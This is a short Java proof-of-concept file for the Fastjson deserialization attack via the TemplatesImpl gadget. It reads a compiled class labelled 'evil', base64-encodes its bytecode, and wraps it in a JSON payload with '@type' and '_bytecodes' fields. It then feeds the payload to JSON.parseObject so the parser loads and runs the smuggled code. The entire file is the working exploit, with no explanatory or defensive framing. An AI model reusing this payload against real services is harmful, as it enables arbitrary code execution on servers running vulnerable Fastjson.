package com.fastjsonDemo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

public class test {
    public test() {
    }

    public static void main(String[] args) {
        try {
            test_autoTypeDeny();
        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }

    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException var3) {
            var3.printStackTrace();
        }

        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        String fileSeparator = System.getProperty("file.separator");
        String evilClassPath = System.getProperty("user.dir") + "/target/classes/com/test/fast/POC.class";
        String evilCode = readClass(evilClassPath);
        System.out.println(evilCode);
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
        JSON.parseObject(text1, Object.class, config, new Feature[0]);
    }
}